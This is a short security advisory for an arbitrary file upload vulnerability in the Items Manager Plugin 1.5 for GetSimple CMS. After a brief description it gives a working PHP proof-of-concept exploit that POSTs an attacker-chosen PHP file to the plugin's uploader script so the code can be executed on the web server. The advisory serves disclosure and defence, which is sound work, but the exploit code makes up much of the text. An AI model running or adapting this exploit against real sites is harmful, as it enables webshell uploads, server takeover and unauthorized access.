source: http://www.securityfocus.com/bid/54255/info

Items Manager Plugin for GetSimple CMS is prone to a vulnerability that lets attackers upload arbitrary files. The issue occurs because the application fails to adequately sanitize user-supplied input.

An attacker can exploit this vulnerability to upload arbitrary code and execute it in the context of the web server process. This may facilitate unauthorized access or privilege escalation; other attacks are also possible.

Items Manager Plugin 1.5 is vulnerable; other versions may also be affected. 

<?php

$uploadfile="lo.php";

$ch = curl_init("http://www.example.com/getsimple/plugins/items/uploader/server/php.php");
curl_setopt($ch, CURLOPT_POST, true);   
curl_setopt($ch, CURLOPT_POSTFIELDS, array('qqfile'=>"@$uploadfile"));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);
   
print "$postResult";

?>